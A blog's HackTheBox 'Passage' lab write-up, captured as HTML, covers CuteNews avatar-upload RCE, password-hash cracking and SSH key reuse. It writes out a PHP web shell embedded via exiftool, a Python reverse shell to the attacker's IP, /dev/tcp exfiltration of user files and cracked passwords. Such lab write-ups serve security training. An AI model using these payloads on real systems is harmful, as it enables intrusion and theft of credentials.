<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Passage | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="Leveraging USBCreator for local privilege escalation on Linux"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/passage/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Passage"><meta property="og:description" content="Leveraging USBCreator for local privilege escalation on Linux"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/passage/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/passage/imgs/image-20210507193038647.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-05-07T19:30:38+07:00"><meta property="article:modified_time" content="2021-05-07T19:30:38+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/passage/imgs/image-20210507193038647.png"><meta name=twitter:title content="HackTheBox - Passage"><meta name=twitter:description content="Leveraging USBCreator for local privilege escalation on Linux"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Passage","item":"https://fahmifj.github.io/hackthebox/passage/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Passage","name":"HackTheBox - Passage","description":"Leveraging USBCreator for local privilege escalation on Linux","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Passage from HackTheBox hosts a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing me to gain code execution on the system via the avatar upload feature. Examining the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to a user. The user is using the same SSH key with another user. There is a unpatched package called USBCreator and it has vulnerability that allows an attacker to perform arbitrary file as root without supplying a password.\nSkills Learned CuteNews 2.1.2 exploitation\nUSBCreator D-bus exploitation\nTools Nmap hashcat (Windows) - https://hashcat.net/hashcat/ Exiftool - https://exiftool.org/ gdbus - Preinstalled in the target machine. Reconnaissance Nmap An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.\n→ root@kali «passage» «10.10.14.31» $ mkdir nmap; nmap -sC -sV -oN initial-passage -v 10.10.10.206 # Nmap 7.80 scan initiated Sat Sep 5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206 Nmap scan report for 10.10.10.206 Host is up (0.074s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel As SSH usually requires credentials, I’ll enumerate the web server on port 80.\nEnumeration TCP 80 - Website The page presenting a kind of news website called “Passage News”.\nThe post titled “Implemented Fail2Ban” states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.\nInspecting the page sources finds a directory called “CuteNews”. I also find the hostname passage.htb.\nAdding /CuteNews to the URL redirects me to a login page.\nI can register as normal user.\nSearchsploit I threw “CuteNews 2.1.2” to searchsploit and it returned several exploits.\n→ root@kali «passage» «10.10.14.31» $ searchsploit 'CuteNews 2.1.2' ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit) | php/remote/46698.rb CuteNews 2.1.2 - Arbitrary File Deletion | php/webapps/48447.txt CuteNews 2.1.2 - Authenticated Arbitrary File Upload | php/webapps/48458.txt ------------------------------------------------------------------- --------------------------------- I’ll go with the ‘avatar’ RCE.\nFoothold Shell as www-data CuteNews CVE-2019-11447 It turns out the ‘avatar’ RCE exploit was a CVE. The exploit module description as follows:\nThis module exploits a command execution vulnerability in CuteNews prior to 2.1.2. The attacker can infiltrate the server through the avatar upload process in the profile area. There is no realistic control of the $imgsize function in “/core/modules/dashboard.php” Header content of the file can be changed and the control can be bypassed. We can use the “GIF” header for this process. An ordinary user is enough to exploit the vulnerability. No need for admin user. The module creates a file for you and allows RCE.\nI can also exploit this manually.\nI still have the payload that I made using exiftool in my previous Magic write-up. If I don’t have it, I can create a new one, embedding a PHP web shell as a comment.\n→ root@kali «passage» «10.10.14.31» $ exiftool -Comment='\u003c?php echo \"\"; system($_GET[\"cmd\"]); ?\u003e' iamf.jpg I’ll rename my jpeg image to iamfr.php, and then I’ll upload it as my avatar (Dashboard –\u003e Personal Options).\nThe image is located at http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php\nI’ll send a Python reverse shell through the web shell and capture it on my nc listener.\nhttp://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.31\",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' I have an interactive shell now.\n→ root@iamf «passage» «10.10.14.31» $ rlwrap nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.206] 37062 bash: cannot set terminal process group (1678): Inappropriate ioctl for device bash: no job control in this shell www-data@passage:/var/www/html/CuteNews/uploads$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@passage:/var/www/html/CuteNews/uploads$ python -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@passage:/var/www/html/CuteNews/uploads$ www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm-256color Privilege Escalation Shell as paul Internal Enumeration There are two users in home directory.\nwww-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home ls -l /home total 8 drwxr-x--- 17 nadav nadav 4096 Mar 5 09:21 nadav drwxr-x--- 17 paul paul 4096 Mar 5 08:32 paul On /var/www/html/CuteNews/cdata/users, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.\nApologize for the image quality (also for the white background), it was recovered from my KeepNote app.\nI’ll send those files to my machine as one file using cat and dev/tcp trick\nwww-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php \u003e /dev/tcp/10.10.14.31/9000 I redirected it to a file called cdata.users.\n→ root@iamf «passage» «10.10.14.31» $ nc -nvlp 9000 \u003e cdata.users listening on [any] 9000 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.206] 55022 I can perform a bulk decode on the file contents after removing the PHP tags.\n→ root@iamf «passage» «10.10.14.31» $ cat cdata.users| sed 's/\u003c?php[^\u003e]*\u003e//g' | base64 -d cat cdata.users| sed 's/\u003c?php[^\u003e]*\u003e//g' | base64 -d a:1:{s:5:\"email\";a:1:{s:16:\"paul@passage.htb\";s:10:\"paul-coles\";}}a:1:{s:2:\"id\";a:1:{i:1598829833;s:6:\"egre55\";}}a:1:{s:5:\"email\";a:1:{s:15:\"ahaha@gmail.com\";s:8:\"ivanpogi\";}}a:2:{s:5:\"email\";a:1:{s:15:\"egre55@test.com\";s:6:\"egre55\";}s:4:\"name\";a:1:{s:4:\"debo\";a:11:{s:2:\"id\";s:10:\"1599412470\";s:4:\"name\";s:4:\"debo\";s:3:\"acl\";s:1:\"4\";s:5:\"email\";s:13:\"debo@debo.com\";s:4:\"nick\";s:4:\"debo\";s:4:\"pass\";s:64:\"b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52\";s:4:\"more\";s:60:\"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\";s:6:\"avatar\";s:20:\"avatar_debo_bash.php\" ...... And that was a mess.\nAmong these outputs, there is one that interesting.\n...[SNIP]...\"pass\";s:64:\"b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52\"...[SNIP]... hash-identifier identifies it as SHA-256.\n→ root@kali «passage» «192.168.43.234» $ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068 ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /'__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # ######################################################################### -------------------------------------------------- Possible Hashs: [+] SHA-256 [+] Haval-256 ...... It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like /etc/passwd).\nKnowing that, I can add another filter using grep to grab the password hashes.\n→ root@kali «passage» «192.168.43.234» $ cat cdata.users| sed 's/\u003c?php[^\u003e]*\u003e//g' | base64 -d | grep -o -E -e \"[0-9a-f]{64}\" b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426 41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9 59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4 Cracking the Hashes hashcat recovered five passwords.\n$ ./hashcat.exe -m 1400 hashes/passage.hashes ../rockyou.txt -O --show b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1 e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker 59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario SU - paul I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with su, and password atlanta1 worked on paul.\nwww-data@passage:/home$ su paul su paul Password: atlanta1 paul@passage:~$ Shell as nadav Shared SSH keys Escalating from paul to nadav is pretty straight forward, I found out that user nadav uses the same SSH keys as user paul.\npaul@passage:~/.ssh$ cat id_rsa.pub \u0026\u0026 cat authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage So I can just SSH from paul to nadav.\npaul@passage:~/.ssh$ ssh nadav@passage.htb Last login: Sun Sep 6 11:12:03 2020 from 127.0.0.1 nadav@passage:~$ id id uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) Shell as root Internal enumeration Since nadav is a member of the sudo group, I can just type sudo su to escalate to root, but unfortunately it requires nadav’s password.\nSo I looking around nadav’s home directory, and there is a .viminfo file (not sure if it’s from the box or other players).\nThe file contains the following information.\n...... # Command Line History (newest to oldest): :wq :%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g ...... # File marks: '0 12 7 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf '1 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf # Jumplist (newest first): -' 12 7 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -' 1 0 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -' 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -' 1 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -' 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -' 1 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf # History of marks within files (newest to oldest): \u003e /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \" 12 7 \u003e /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf \" 2 0 . 2 0 + 2 0 The history of files points to these two configuration files:\n/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf The 51-ubuntu-admin.conf defines there are only two groups that can be used for authentication when administrator authentication is needed, sudo and admin. This file is used by Polkit, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.\nnadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf [Configuration] AdminIdentities=unix-group:sudo;unix-group:admin I don’t really understand in depth about com.ubuntu.USBCreator.conf. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the sudo or the admin group (defined by the 51-ubuntu-admin.conf file)\nnadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u003c!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\" \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"\u003e ","wordCount":"1794","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/passage/imgs/image-20210507193038647.png","datePublished":"2021-05-07T19:30:38+07:00","dateModified":"2021-05-07T19:30:38+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/passage/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Passage</h1><p class=post-description>Leveraging USBCreator for local privilege escalation on Linux</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>May 07, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>9 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-paul aria-label="Shell as paul">Shell as paul</a></li><li><a href=#shell-as-nadav aria-label="Shell as nadav">Shell as nadav</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/passage/imgs/image-20210507193038647_hu389884d99e8b33a54bd2e94ea2bb8f5d_154660_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/passage/imgs/image-20210507193038647_hu389884d99e8b33a54bd2e94ea2bb8f5d_154660_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/passage/imgs/image-20210507193038647_hu389884d99e8b33a54bd2e94ea2bb8f5d_154660_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/passage/imgs/image-20210507193038647.png 741w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/passage/imgs/image-20210507193038647.png alt="HackTheBox - Passage" width=741 height=455><p>HackTheBox - Passage</p></figure><p>Passage from HackTheBox hosts a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing me to gain code execution on the system via the avatar upload feature. Examining the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to a user. The user is using the same SSH key with another user. There is a unpatched package called USBCreator and it has vulnerability that allows an attacker to perform arbitrary file as root without supplying a password.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li><p>CuteNews 2.1.2 exploitation</p></li><li><p>USBCreator D-bus exploitation</p></li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>hashcat (Windows) - <a href=https://hashcat.net/hashcat/>https://hashcat.net/hashcat/</a></li><li>Exiftool - <a href=https://exiftool.org/>https://exiftool.org/</a></li><li>gdbus - Preinstalled in the target machine.</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «passage» «10.10.14.31»
</span></span><span class=line><span class=cl>$ mkdir nmap<span class=p>;</span> nmap -sC -sV -oN initial-passage -v 10.10.10.206
</span></span><span class=line><span class=cl><span class=c1># Nmap 7.80 scan initiated Sat Sep  5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.206
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.074s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu <span class=m>4</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.18 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.18 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Passage News
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>As SSH usually requires credentials, I&rsquo;ll enumerate the web server on port 80.</p><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>The page presenting a kind of news website called &ldquo;Passage News&rdquo;.</p><p><div class=img-container><img src=imgs/d7ac9042cb934e58912a75669587968e.png alt=d7ac9042cb934e58912a75669587968e></div></p><p>The post titled &ldquo;Implemented Fail2Ban&rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.</p><p><div class=img-container><img src=imgs/9eb82005d29d4c4e85aaa22c778203b0.png alt=9eb82005d29d4c4e85aaa22c778203b0></div></p><p>Inspecting the page sources finds a directory called &ldquo;CuteNews&rdquo;. I also find the hostname <code>passage.htb</code>.</p><p><div class=img-container><img src=imgs/c78e8e637c114e089fc80228b7b92d20.png alt=c78e8e637c114e089fc80228b7b92d20></div></p><p>Adding <code>/CuteNews</code> to the URL redirects me to a login page.</p><p><div class=img-container><img src=imgs/7fa49ed1b8fc47d6ad274565962e4007.png alt=7fa49ed1b8fc47d6ad274565962e4007></div></p><p>I can register as normal user.</p><p><div class=img-container><img src=imgs/image-20210508014328401.png alt=image-20210508014328401></div></p><h4 id=searchsploit>Searchsploit<a class=anchor aria-hidden=true href=#searchsploit>#</a></h4><p>I threw &ldquo;CuteNews 2.1.2&rdquo; to <code>searchsploit</code> and it returned several exploits.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «passage» «10.10.14.31»
</span></span><span class=line><span class=cl>$ searchsploit <span class=s1>&#39;CuteNews 2.1.2&#39;</span>
</span></span><span class=line><span class=cl>------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                     <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>CuteNews 2.1.2 - <span class=s1>&#39;avatar&#39;</span> Remote Code Execution <span class=o>(</span>Metasploit<span class=o>)</span>       <span class=p>|</span> php/remote/46698.rb
</span></span><span class=line><span class=cl>CuteNews 2.1.2 - Arbitrary File Deletion                           <span class=p>|</span> php/webapps/48447.txt
</span></span><span class=line><span class=cl>CuteNews 2.1.2 - Authenticated Arbitrary File Upload               <span class=p>|</span> php/webapps/48458.txt
</span></span><span class=line><span class=cl>------------------------------------------------------------------- ---------------------------------
